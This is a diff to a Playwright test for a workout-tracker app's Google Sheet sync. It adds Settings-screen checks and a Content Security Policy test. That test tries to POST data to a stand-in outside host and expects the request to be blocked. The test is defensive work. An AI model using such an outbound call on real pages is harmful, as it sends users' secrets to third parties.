@@ -15,6 +15,8 @@ test('fresh install shows the real program and the 16.10 workout once; sync keep
   const gas = await startFakeGas({ port: 0 });
   const gasUrl = `http://127.0.0.1:${gas.server.address().port}/exec`;
   const sheet = async () => (await fetch(`http://127.0.0.1:${gas.server.address().port}/__state`)).json();
+  const cspViolations = [];
+  page.on('console', (m) => /Content Security Policy/i.test(m.text()) && cspViolations.push(m.text()));
   try {
     await page.goto(base);
     await ready(page);
@@ -56,10 +58,26 @@ test('fresh install shows the real program and the 16.10 workout once; sync keep
     st = await state(page);
     expect(st.activeSets).toEqual([]);
 
-    // Sync: the sheet gets one copy; a second phone importing again changes nothing.
-    await connectSync(page, gasUrl, gas.token);
-    await page.evaluate(() => window.__trainer.sync.syncNow());
+    // Connect through the real Settings screen, the way the owner will on the phone.
+    await page.locator('.sync').first().click();
+    await page.locator('#sync-url').fill('https://docs.google.com/spreadsheets/d/10jl/edit');
+    await page.locator('#sync-token').fill(gas.token);
+    await page.getByRole('button', { name: 'Сохранить и проверить связь' }).click();
+    await expect(page.getByText('Это адрес самой таблицы')).toBeVisible();
+    expect((await state(page)).sync.state).toBe('off'); // nothing saved
+    await page.locator('#sync-url').fill(gasUrl);
+    await page.locator('#sync-token').fill(` ${gas.token}\n`); // pasted with stray whitespace
+    await page.getByRole('button', { name: 'Сохранить и проверить связь' }).click();
+    await expect(page.getByText('Подключено к таблице «Тренировки (тест)»')).toBeVisible();
     await expect.poll(async () => (await state(page)).outbox).toBe(0);
+    await expect(page.getByText(/Синхронизировано в \d\d:\d\d/)).toBeVisible();
+
+    // CSP: the page cannot send anything (e.g. the access key) to other hosts.
+    const external = await page.evaluate(() => fetch('https://example.com/collect', { method: 'POST', body: 'x' }).then(() => 'sent', () => 'blocked'));
+    expect(external).toBe('blocked');
+    expect(cspViolations.filter((t) => !t.includes('example.com'))).toEqual([]);
+
+    // A second phone importing again changes nothing in the sheet.
     let rows = await sheet();
     expect(rows.App_Sets.length - 1).toBe(23);
     expect(rows.App_Program.length - 1).toBe(29);
